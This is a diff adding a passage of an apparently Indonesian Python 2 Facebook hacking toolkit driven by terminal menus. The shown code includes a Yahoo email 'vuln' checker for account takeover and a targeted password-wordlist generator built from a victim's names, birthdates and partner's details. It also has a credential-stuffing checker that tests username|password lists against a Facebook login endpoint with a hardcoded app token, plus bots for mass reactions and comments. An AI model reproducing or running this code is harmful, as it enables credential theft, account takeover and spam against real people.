+			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+			br._factory.is_html = True
+			br.select_form(nr=0)
+			br["username"] = mail
+			klik = br.submit().read()
+			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+			try:
+				pek = jok.search(klik).group()
+			except:
+				continue
+			if '"messages.ERROR_INVALID_USERNAME">' in pek:
+				save.write(mail + '\n')
+				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
+				berhasil.append(mail)
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
+	
+
+		
+##### MENU BOT #####
+#----------------------------------------#
+def menu_bot():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	bot_pilih()
+#////////////
+def bot_pilih():
+	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if bots =="":
+		print "\033[1;91m[!] Wrong input"
+		bot_pilih()
+	elif bots =="1":
+		menu_react()
+	elif bots =="2":
+		grup_react()
+	elif bots =="3":
+		bot_komen()
+	elif bots =="4":
+		grup_komen()
+	elif bots =="5":
+		deletepost()
+	elif bots =="6":
+		accept()
+	elif bots =="7":
+		unfriend()
+	elif bots =="0":
+		menu()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		bot_pilih()
+		
+##### MENU REACT #####
+def menu_react():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	react_pilih()
+#//////////////
+def react_pilih():
+	global tipe
+	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if aksi =="":
+		print "\033[1;91m[!] Wrong input"
+		react_pilih()
+	elif aksi =="1":
+		tipe = "LIKE"
+		react()
+	elif aksi =="2":
+		tipe = "LOVE"
+		react()
+	elif aksi =="3":
+		tipe = "WOW"
+		react()
+	elif aksi =="4":
+		tipe = "HAHA"
+		react()
+	elif aksi =="5":
+		tipe = "SAD"
+		react()
+	elif aksi =="6":
+		tipe = "ANGRY"
+		react()
+	elif aksi =="0":
+		menu_bot()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		react_pilih()
+#####NEXT
+def react():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	try:
+		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
+		ah = json.loads(oh.text)
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		print 42*"\033[1;97m═"
+		for a in ah['feed']['data']:
+			y = a['id']
+			reaksi.append(y)
+			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
+			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
+		print 42*"\033[1;97m═"
+		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	except KeyError:
+		print"\033[1;91m[!] ID not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+		
+##### BOT REACT GRUP #####
+def grup_react():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	reactg_pilih()
+#//////////////
+def reactg_pilih():
+	global tipe
+	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if aksi =="":
+		print "\033[1;91m[!] Wrong input"
+		reactg_pilih()
+	elif aksi =="1":
+		tipe = "LIKE"
+		reactg()
+	elif aksi =="2":
+		tipe = "LOVE"
+		reactg()
+	elif aksi =="3":
+		tipe = "WOW"
+		reactg()
+	elif aksi =="4":
+		tipe = "HAHA"
+		reactg()
+	elif aksi =="5":
+		tipe = "SAD"
+		reactg()
+	elif aksi =="6":
+		tipe = "ANGRY"
+		reactg()
+	elif aksi =="0":
+		menu_bot()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		reactg_pilih()
+#####NEXT
+def reactg():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	try:
+		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
+		asw=json.loads(r.text)
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+	except KeyError:
+		print"\033[1;91m[!] Group not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		grup_react()
+	try:
+		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
+		ah = json.loads(oh.text)
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		print 42*"\033[1;97m═"
+		for a in ah['feed']['data']:
+			y = a['id']
+			reaksigrup.append(y)
+			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
+			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
+		print 42*"\033[1;97m═"
+		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	except KeyError:
+		print"\033[1;91m[!] ID not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	
+##### BOT KOMEN #####
+def bot_komen():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
+	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
+	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	km=km.replace('<>','\n')
+	try:
+		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
+		a = json.loads(p.text)
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		print 42*"\033[1;97m═"
+		for s in a['feed']['data']:
+			f = s['id']
+			komen.append(f)
+			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
+			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
+		print 42*"\033[1;97m═"
+		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komen))
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	except KeyError:
+		print"\033[1;91m[!] ID not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+
+##### BOT KOMEN GRUP #####
+def grup_komen():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
+	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
+	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
+	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	km=km.replace('<>','\n')
+	try:
+		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
+		asw=json.loads(r.text)
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+	except KeyError:
+		print"\033[1;91m[!] Group not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	try:
+		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
+		a = json.loads(p.text)
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		print 42*"\033[1;97m═"
+		for s in a['feed']['data']:
+			f = s['id']
+			komengrup.append(f)
+			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
+			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
+		print 42*"\033[1;97m═"
+		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komengrup))
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	except KeyError:
+		print"\033[1;91m[!] Error"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+		
+##### HAPUS POST #####
+def deletepost():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		lol = json.loads(nam.text)
+		nama = lol['name']
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
+	jalan("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
+	print 42*"\033[1;97m═"
+	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
+	asus = json.loads(asu.text)
+	for p in asus['data']:
+		id = p['id']
+		piro = 0
+		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
+		ok = json.loads(url.text)
+		try:
+			error = ok['error']['message']
+			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
+		except TypeError:
+			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
+			piro += 1
+		except requests.exceptions.ConnectionError:
+			print"\033[1;91m[!] Connection Error"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			menu_bot()
+	print 42*"\033[1;97m═"
+	print"\033[1;91m[+] \033[1;92mDone"
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_bot()
+	
+##### ACCEPT FRIEND #####
+def accept():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
+	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
+	teman = json.loads(r.text)
+	if '[]' in str(teman['data']):
+		print"\033[1;91m[!] No friend request"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
+	for i in teman['data']:
+		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
+		a = json.loads(gas.text)
+		if 'error' in str(a):
+			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
+		else:
+			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
+	print 42*"\033[1;97m═"
+	print"\033[1;91m[+] \033[1;92mDone"
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_bot()
+	
+##### UNFRIEND ####
+def unfriend():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print "\033[1;97mStop \033[1;91mCTRL+C"
+	print 42*"\033[1;97m═"
+	try:
+		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+		cok = json.loads(pek.text)
+		for i in cok['data']:
+			nama = i['name']
+			id = i['id']
+			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
+			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
+	except IndexError: pass
+	except KeyboardInterrupt:
+		print "\033[1;91m[!] Stopped"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_bot()
+	print"\n\033[1;91m[+] \033[1;92mDone"
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_bot()
+	
+#### LAIN LAIN #####
+#                                    #
+####MENU LAIN#####
+def lain():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	pilih_lain()
+#////////////
+def pilih_lain():
+	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if other =="":
+		print "\033[1;91m[!] Wrong input"
+		pilih_lain()
+	elif other =="1":
+		status()
+	elif other =="2":
+		wordlist()
+	elif other =="3":
+		check_akun()
+	elif other =="4":
+		grupsaya()
+	elif other =="5":
+		guard()
+	elif other =="0":
+		menu()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		pilih_lain()
+		
+##### STATUS #####
+def status():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
+	if msg == "":
+		print "\033[1;91m[!] Don't be empty"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	else:
+		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
+		op = json.loads(res.text)
+		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
+		print 42*"\033[1;97m═"
+		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+		
+########### CREATE WORDLIST ##########
+def wordlist():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.system('reset')
+		print logo
+		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
+		print 42*"\033[1;97m═"
+		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
+		file = open(a+".txt", 'w')
+		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
+		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
+		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
+		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		f=e[0:2]
+		g=e[2:4]
+		h=e[4:]
+		print 42*"\033[1;97m═"
+		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
+		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
+		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
+		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
+		l=k[0:2]
+		m=k[2:4]
+		n=k[4:]
+		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
+		wg = 0
+		while (wg < 100):
+			wg = wg + 1
+			file.write(a + str(wg) + '\n')
+		en = 0
+		while (en < 100):
+			en = en + 1
+			file.write(i + str(en) + '\n')
+		word = 0
+		while (word < 100):
+			word = word + 1
+			file.write(d + str(word) + '\n')
+		gen = 0
+		while (gen < 100):
+			gen = gen + 1
+			file.write(j + str(gen) + '\n')
+		file.close()
+		time.sleep(1.5)
+		print 42*"\033[1;97m═"
+		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	except IOError, e:
+		print("\033[1;91m[!] Failed")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+
+##### CHECKER #####
+def check_akun():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
+	print 42*"\033[1;97m═"
+	live = []
+	cek = []
+	die = []
+	try:
+		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
+		list = open(file,'r').readlines()
+	except IOError:
+		print ("\033[1;91m[!] File not found")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
+	for meki in list:
+		username, password = (meki.strip()).split(str(pemisah))
+		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+		data = requests.get(url)
+		mpsh = json.loads(data.text)
+		if 'access_token' in mpsh:
+			live.append(password)
+			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
+		elif 'www.facebook.com' in mpsh["error_msg"]:
+			cek.append(password)
+			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
+		else:
+			die.append(password)
+			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
+	print 42*"\033[1;97m═"
+	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	lain()
+	
+##### GRUP SAYA #####
+def grupsaya():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('reset')
+	print logo
+	try:
+		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
+		gud = json.loads(uh.text)
+		for p in gud['data']:
+			nama = p["name"]
+			id = p["id"]
+			f=open('out/Grupid.txt','w')
+			listgrup.append(id)
+			f.write(id + '\n')
+			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
+		print 42*"\033[1;97m═"
+		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
+		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
+		f.close()
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	except (KeyboardInterrupt,EOFError):
+		print("\033[1;91m[!] Stopped")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	except KeyError:
+		os.remove('out/Grupid.txt')
+		print('\033[1;91m[!] Group not found')
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No Connection"
+		keluar()
+	except IOError:
+		print "\033[1;91m[!] Error"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+		
+##### PROFIL GUARD #####
+def guard():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if g == "1":
+		aktif = "true"
+		gaz(toket, aktif)
+	elif g == "2":
+		non = "false"
+		gaz(toket, non)
+	elif g =="0":
+		lain()
+	elif g =="":
+		keluar()
+	else:
+		keluar()
+	
+def get_userid(toket):
+	url = "https://graph.facebook.com/me?access_token=%s"%toket
+	res = requests.get(url)
+	uid = json.loads(res.text)
+	return uid["id"]
+		
+def gaz(toket, enable = True):
+	id = get_userid(toket)
+	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
+	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
+	url = "https://graph.facebook.com/graphql"
+	res = requests.post(url, data = data, headers = headers)
+	print(res.text)
+	if '"is_shielded":true' in res.text:
+		os.system('reset')
+		print logo
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	elif '"is_shielded":false' in res.text:
+		os.system('reset')
+		print logo
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		lain()
+	else:
+		print "\033[1;91m[!] Error"
+		keluar()
+	
+lisensi()
